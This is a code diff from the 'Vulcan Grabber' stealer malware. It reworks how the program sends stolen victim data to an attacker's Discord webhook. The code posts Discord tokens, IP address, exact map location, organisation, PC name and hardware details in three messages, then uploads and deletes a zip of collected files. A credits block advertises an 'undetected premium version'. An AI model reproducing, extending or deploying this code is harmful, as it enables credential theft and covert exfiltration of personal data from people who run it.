@@ -286,7 +286,7 @@ class Vulcan_Grabber(functions):
         tokens = ''
         for toe in self.tokens:
             tokens += f'{toe}\n'
-        embed = {
+        embed1 = {
             'username'
             'avatar_url': 'https://raw.githubusercontent.com/Maywitz/Images/main/Profile-Picture/Maywitz.png',
             'embeds': [
@@ -296,55 +296,60 @@ class Vulcan_Grabber(functions):
                         'url': 'https://github.com/Maywitz/Vulcan-Grabber',
                         'icon_url': 'https://raw.githubusercontent.com/Maywitz/Images/main/Profile-Picture/Maywitz.png'
                     },
-                    'description': f'[Exact Google Maps Location]({pulled_googlemap})\n\n',
-                    'fields': [
-                        {
-                            'name': '\u200b',
-                            'value': f'''```fix
-                                IP:᠎ {pulled_ip}
-                                Org:᠎ {pulled_org}
-                                Region:᠎ {pulled_region}
-                                Country:᠎ {pulled_country}
-                                City:᠎ {pulled_city}```
-                            '''.replace(' ', ''),
-                            'inline': True
-                        },
-                        {
-                            'name': '\u200b',
-                            'value': f'''```fix
-                                PCName: {os.getenv('COMPUTERNAME').replace(" ", "᠎ ")}
-                                DiskSpace:᠎ {pulled_disk}GB
-                                Ram:᠎ {pulled_ram}GB```
-                            '''.replace(' ', ''),
-                            'inline': True
-                        },
-                        {
-                            'name': '**Tokens:**',
-                            'value': f'''```yaml
-                                {tokens if tokens else "None"}```
-                            '''.replace(' ', ''),
-                            'inline': False
-                        },
-                        {
-                            'name': '**CREDITS:**',
-                            'value': f'''```yaml
-                                __      ___    _ _      _____          _   _ 
-                                \ \    / / |  | | |    / ____|   /\   | \ | |
-                                 \ \  / /| |  | | |   | |       /  \  |  \| |
-                                  \ \/ / | |  | | |   | |      / /\ \ | . ` |
-                                   \  /  | |__| | |___| |____ / ____ \| |\  |
-                                    \/    \____/|______\_____/_/    \_\_| \_|
-                                    ```\n\nJoin the discord server for undetected premium version : https://discord.gg/qxt6aC8U2F'''
-                            'inline': False
-                        }
-                    ],
+                    'description': f'[Exact Google Maps Location]({pulled_googlemap})\n\n```IP:᠎ {pulled_ip}\nOrg:᠎ {pulled_org}\nRegion:᠎ {pulled_region}\nCountry:᠎ {pulled_country}\nCity:᠎ {pulled_city}\nPCName: {os.getenv('COMPUTERNAME').replace(" ", "᠎ ")}\nDiskSpace:᠎ {pulled_disk}GB\nRam:᠎ {pulled_ram}GB```',
                     'footer': {
                         'text': 'Vulcan Grabber | by Maywitz, https://discord.gg/qxt6aC8U2F'
                     }
                 }
             ]
         }
-        httpx.post(self.webhook_url, json = embed)
+        embed2 = {
+            'username'
+            'avatar_url': 'https://raw.githubusercontent.com/Maywitz/Images/main/Profile-Picture/Maywitz.png',
+            'embeds': [
+                {
+                    'author': {
+                        'name': f'*Maywitz grabbed {os.getlogin()}*',
+                        'url': 'https://github.com/Maywitz/Vulcan-Grabber',
+                        'icon_url': 'https://raw.githubusercontent.com/Maywitz/Images/main/Profile-Picture/Maywitz.png'
+                    },
+                    'description': f'''```yaml
+                                    {tokens if tokens else "None"}```
+                                   '''.replace(' ', ''),
+                    'footer': {
+                        'text': 'Vulcan Grabber | by Maywitz, https://discord.gg/qxt6aC8U2F'
+                    }
+                }
+            ]
+        }
+        
+        embed3 = {
+            'username'
+            'avatar_url': 'https://raw.githubusercontent.com/Maywitz/Images/main/Profile-Picture/Maywitz.png',
+            'embeds': [
+                {
+                    'author': {
+                        'name': f'*Maywitz grabbed {os.getlogin()}*',
+                        'url': 'https://github.com/Maywitz/Vulcan-Grabber',
+                        'icon_url': 'https://raw.githubusercontent.com/Maywitz/Images/main/Profile-Picture/Maywitz.png'
+                    },
+                    'description': f'''```yaml
+                                __      ___    _ _      _____          _   _ 
+                                \ \    / / |  | | |    / ____|   /\   | \ | |
+                                 \ \  / /| |  | | |   | |       /  \  |  \| |
+                                  \ \/ / | |  | | |   | |      / /\ \ | . ` |
+                                   \  /  | |__| | |___| |____ / ____ \| |\  |
+                                    \/    \____/|______\_____/_/    \_\_| \_|
+                                    ```\n\nJoin the discord server for undetected premium version : https://discord.gg/qxt6aC8U2F''',
+                    'footer': {
+                        'text': 'Vulcan Grabber | by Maywitz, https://discord.gg/qxt6aC8U2F'
+                    }
+                }
+            ]
+        }
+        httpx.post(self.webhook_url, json = embed1)
+        httpx.post(self.webhook_url, json = embed2)
+        httpx.post(self.webhook_url, json = embed3)
         with open(newzip, 'rb') as f:
             httpx.post(self.webhook_url, files = {'upload_file': f})
         os.remove(newzip)
